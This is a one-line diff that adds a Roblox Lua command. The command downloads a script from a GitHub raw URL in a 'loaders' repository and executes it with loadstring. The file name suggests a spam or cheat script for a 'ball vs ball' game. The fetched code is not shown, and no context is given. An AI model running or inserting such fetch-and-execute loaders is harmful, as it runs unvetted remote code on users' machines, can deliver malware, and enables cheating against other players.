@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/ball-vs-ball-spam7-cm4vgxzho8pj7r.lua"))()
